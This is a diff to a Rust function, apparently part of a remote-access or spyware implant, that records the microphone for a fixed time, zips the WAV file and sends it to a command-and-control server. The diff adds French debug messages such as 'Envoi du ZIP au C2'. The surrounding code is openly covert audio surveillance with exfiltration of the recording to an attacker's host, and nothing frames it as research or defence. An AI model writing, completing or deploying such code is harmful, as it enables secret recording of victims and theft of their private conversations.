@@ -96,21 +96,31 @@ pub async fn record_mic(duration_secs: u64) -> Result<()> {
     };
 
     stream.play()?;
+    println!("[MIC] Stream démarré, enregistrement en cours...");
     tokio::time::sleep(Duration::from_secs(duration_secs)).await;
+    println!("[MIC] Délai de 30 sec terminé, arrêt du stream...");
     drop(stream);
 
+    println!("[MIC] Finalisation du fichier...");
     let writer_sync = writer_async.lock().await;
+    println!("[MIC] Lock acquis sur le writer");
     {
         let mut guard = writer_sync.lock().unwrap();
         if let Some(writer) = guard.take() {
+            println!("[MIC] Finalisation du WAV...");
             writer.finalize()?;
+            println!("[MIC] WAV finalisé");
         }
     }
 
+    println!("[MIC] Création du ZIP...");
     let zip_file = zip_file(&wav_path).await?;
     let zip_path = zip_file.path();
+    println!("[MIC] ZIP créé: {:?}", zip_path);
 
+    println!("[MIC] Envoi du ZIP au C2...");
     let _ = send_zip_to_c2(zip_path).await;
+    println!("[MIC] ZIP envoyé au C2");
 
     Ok(())
 }
